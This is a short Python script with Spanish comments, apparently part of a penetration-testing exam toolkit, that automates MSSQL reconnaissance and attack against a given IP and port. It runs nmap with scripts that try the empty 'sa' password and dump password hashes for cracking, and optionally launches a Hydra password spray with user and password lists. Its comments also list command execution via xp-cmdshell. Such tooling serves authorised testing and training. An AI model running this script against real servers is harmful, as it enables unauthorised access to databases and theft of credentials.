#!/usr/bin/env python
import subprocess
import sys
import argparse
import pathlib

# Documentación de Scripts NSE
# En ejecución:
# ms-sql-dac: consulta el puerto DAC (administración) de una instancia
# ms-sql-dump-hashes: extrae hashes en formato para John the Ripper (requiere admin)
# ms-sql-empty-password: intenta autenticación con contraseña vacía para la cuenta 'sa'
# ms-sql-info: consulta al servidor de búsqueda (UDP 1434) para información (sin autenticación)
# ms-sql-ntlm-info: enumera información de servicios con autenticación NTLM habilitada

# No en ejecución:
# ms-sql-brute: fuerza bruta de credenciales
# ms-sql-config: consulta bases de datos, servidores vinculados y configuraciones (requiere autenticación)
# ms-sql-hasdbaccess: lista de bases de datos a las que tiene acceso el usuario (requiere autenticación)
# ms-sql-query: ejecuta consulta contra el servidor (requiere autenticación)
# ms-sql-tables: lista tablas por base de datos (requiere autenticación)
# ms-sql-xp-cmdshell: ejecución de comandos en el sistema (requiere admin)
def doNmap():
    print("INFO: Realizando escaneo de scripts MSSQL con nmap para %s:%s" % (ip_address, port))
    try:
        subprocess.check_output(['nmap','-n','-sV','-Pn','-vv','-p',port,'--script=banner,ms-sql-empty-password,ms-sql-dac,ms-sql-dump-hashes,ms-sql-info,ms-sql-ntlm-info,vulners','-oA',"%s/%s_%s_mssql" % (BASE,ip_address,port),ip_address],encoding='utf8')
    except Exception as e:
        print(type(e))
        print("Error desconocido en doNmap en mssqlrecon")

# Hydra configurado para spray rápido
def doHydra():
    print("INFO: Realizando escaneo MSSQL con Hydra contra %s" % (ip_address))
    try:
        hydra_outfile = '%s/%s_%s_mssqlhydra.txt' % (BASE,ip_address,port)
        subprocess.check_output(['hydra','-L','/root/lists/userlist_sqlbrute.txt','-P','/root/lists/quick_password_spray.txt','-f','-o',hydra_outfile,'-u',ip_address,'-s',port,'mssql'])
        with open(hydra_outfile,'r') as h:
            for result in h:
                if "login:" in result:
                    print("[*] Credenciales MSSQL válidas encontradas: %s" % (result))
    except subprocess.CalledProcessError as hydrerr:
        if hydrerr.returncode == 255:
            print("Hydra finalizó antes con código 255, ¡debe haber encontrado algo! Revisa mssqlhydra para ver la salida.")
        elif hydrerr.returncode != 0:
            print("Hydra falló:")
            print(hydrerr.returncode)
            print(hydrerr.output)
        else:
            print("INFO: No se encontraron credenciales MSSQL válidas")

# Función mkdir_p actualizada para Python >= 3.5
def mkdir_p(path):
    pathlib.Path(path).mkdir(parents=True, exist_ok=True) 

if __name__=='__main__':
    parser = argparse.ArgumentParser(description='Script para verificar endpoints MSSQL. Uso: mssqlrecon.py {opciones} <dirección_ip> <puerto>')
    parser.add_argument('ip_address', help="Dirección IP de la máquina Windows objetivo")
    parser.add_argument('port', help="Puerto específico a enumerar")
    parser.add_argument('--hydra', default=False, action='store_true', dest='hydra', help="Especificar para ejecutar Hydra")
    args = parser.parse_args()

    ip_address = args.ip_address
    port = args.port

    BASE = '/root/scripts/recon_enum/results/exam/mssql'
    mkdir_p(BASE)

    doNmap()
    if args.hydra:
        doHydra()

    print("[INFO] TTP: también revisa PowerUpSQL para otras técnicas y enumeraciones en MSSQL")
